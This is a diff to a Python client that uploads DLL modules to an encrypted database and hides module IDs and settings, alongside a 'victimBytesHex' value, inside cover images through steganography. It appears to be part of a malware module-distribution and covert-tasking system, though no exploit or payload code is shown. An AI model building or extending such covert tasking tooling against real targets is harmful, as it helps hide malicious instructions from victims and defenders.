@@ -193,7 +193,6 @@ def UploadNewModule(moduleName : str, DLLPath : str, description : str, username
     
     request = request.encode().ljust(DB_INIT_SIZE_BYTES, b"\0")
     dbSocket.send(request)
-    
     dbResponse = json.loads(aes.decrypt(IncrementNonce(seedNonce,8), dbSocket.recv(1024).rstrip(b"\0"), None).decode())
     print(dbResponse)
 
@@ -274,10 +273,10 @@ Name: {entry["Module Name"]}
 Owner : {entry["Module Owner Username"]}
 Version : {entry["Module Version"]}
 Last Edited: {ReformatTimestamp(entry["Module Last Edited"])}
-Dependencies : {entry["Dependencies"] if (entry["Dependencies"] not in ['""', '"_"', '"-"']) else "None"}
+Dependencies : {entry["Dependencies"].strip('"') if (entry["Dependencies"] not in ['""', '"_"', '"-"']) else "None"}
 
 Description:
-{entry["Module Description"]} 
+{entry["Module Description"].strip('"')} 
 """)
         
         print("-"*20)
@@ -369,14 +368,30 @@ def UpdateModule(moduleName : str, DLLPath : str, description : str, username : 
 def FormStego(modules : list[str], coverPath : str, outPath : str, victimBytesHex : str):
     cover = Image.open(coverPath).convert("RGB")
     modulesBinaryForm = []
+    
+    #We have to add the argument info for each module
+    with open(os.path.join(os.getcwd(), "ModuleSettings.JSON"), "r") as f:
+        moduleSettingsDict = json.load(f)
+    
     for module in modules:
-        moduleBytes = int.to_bytes(NO_BYTES_PER_MODULE, int(module), byteorder="big", signed=False)
+        moduleBytes = int(module).to_bytes(NO_BYTES_PER_MODULE, byteorder="big", signed=False)
         moduleBytesStrForm = "".join(f'{bit:08b}' for bit in moduleBytes)
         for bitStr in moduleBytesStrForm:
             modulesBinaryForm.append(bitStr)
+        
+        #Adding the module info
+        moduleSetting = base64.b64decode(moduleSettingsDict[module])
+        lengthDifference = 62 - len(moduleSetting)
+        if(lengthDifference > 0):
+            moduleSetting += os.urandom(lengthDifference)
+        
+        moduleSettingStrForm = "".join(f'{bit:08b}' for bit in moduleSetting)
+        
+        for bitStr in moduleSettingStrForm:
+            modulesBinaryForm.append(bitStr)
     
     #Adding the transmission end marker
-    endTransmissionMarker = ["0", "0", "0", "0", "0", "0", "0", "0"] #This is blocked on the database
+    endTransmissionMarker = ["0"] * (NO_BYTES_PER_MODULE * 8) #This is blocked on the database
     for bit in endTransmissionMarker:
         modulesBinaryForm.append(bit)
     
@@ -458,7 +473,8 @@ currentShopPage = -1
 
 print("Welcome! Input .help to start")
 while running:
-    userInput = input().split(" ")
+    userInput = input().split(" --")
+    print(userInput)
     if(userInput[0] == ".define" and (not shopping)):
         DefineNewUser(userInput[1], userInput[2])
     
